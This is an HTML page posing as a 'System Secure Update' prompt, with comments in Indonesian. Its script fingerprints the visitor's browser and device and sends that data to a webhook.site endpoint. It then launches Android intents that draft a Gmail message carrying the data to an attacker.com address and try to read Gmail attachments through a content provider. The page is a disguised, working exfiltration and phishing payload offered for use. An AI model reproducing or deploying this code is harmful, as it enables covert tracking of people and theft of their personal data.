<!DOCTYPE html>
<html>
<head><title>System Secure Update</title></head>
<body style="background:#000;color:#f00;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
    <div id="ignite" style="padding:60px;border:2px solid #f00;text-align:center;cursor:pointer;background:rgba(255,0,0,0.05);box-shadow:0 0 50px #f00">
        <h1 style="letter-spacing:5px">V203_INBOX_SHADOW</h1>
        <div id="status" style="color:#aaa">MANDATORY_SECURITY_SYNC_REQUIRED</div>
    </div>

<script>
    const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";

    document.getElementById('ignite').onclick = async () => {
        const statusEl = document.getElementById('status');
        statusEl.innerText = "INJECTING_SECURE_TUNNEL...";

        // 1. ADVANCED FINGERPRINTING (Canvas DNA + Audio Context)
        // Kita mengambil sidik jari unik untuk memastikan target bisa dilacak permanen
        const getFingerprint = () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = "rgb(120,120,120)";
            ctx.fillRect(5,5,50,50);
            return btoa(canvas.toDataURL()).substring(100, 200);
        };

        const recon_data = {
            id: "V203_ULTRA",
            dna: getFingerprint(),
            sys: {
                ua: navigator.userAgent,
                mem: navigator.deviceMemory,
                cores: navigator.hardwareConcurrency,
                lang: navigator.languages
            }
        };

        // 2. EXFILTRATION (Kirim data recon sebelum serangan Intent)
        navigator.sendBeacon(`${target}?v=V203_INIT`, btoa(JSON.stringify(recon_data)));

        // 3. INTENT EXTRA INJECTION (The "Heavy" Attack)
        // Kita menggunakan parameter 'S.android.intent.extra.TEXT' dan 'S.android.intent.extra.SUBJECT'
        // untuk mencoba memanipulasi state internal aplikasi Gmail.
        const sensitiveGmailIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.SENDTO;" + 
            "data=mailto:;" + // Memaksa Gmail masuk ke mode Compose/Draft
            "S.android.intent.extra.EMAIL=security-audit@attacker.com;" + 
            "S.android.intent.extra.SUBJECT=CRITICAL_DATA_DUMP;" + 
            "S.android.intent.extra.TEXT=" + btoa(JSON.stringify(recon_data)) + ";" + // Menyisipkan data sistem ke dalam draf
            "package=com.google.android.gm;" + 
            "end";

        // 4. THE LEAP TO CONTENT PROVIDER
        // Mencoba membocorkan file lampiran Gmail jika aplikasi target rentan (CVE-2020-0103 style)
        const contentLeakIntent = 
            "intent:#Intent;" +
            "action=android.intent.action.VIEW;" +
            "data=content://com.google.android.gm.sapi/attachments/0/0/ALL;" +
            "package=com.google.android.gm;" +
            "end";

        setTimeout(() => {
            // Langkah pertama: Membuka Gmail dengan data injeksi
            window.location.href = sensitiveGmailIntent;
            
            // Langkah kedua (Brutal): Mencoba mengakses Content Provider Gmail
            setTimeout(() => {
                window.location.href = contentLeakIntent;
            }, 1200);
        }, 500);
    };
</script>
</body>
</html>
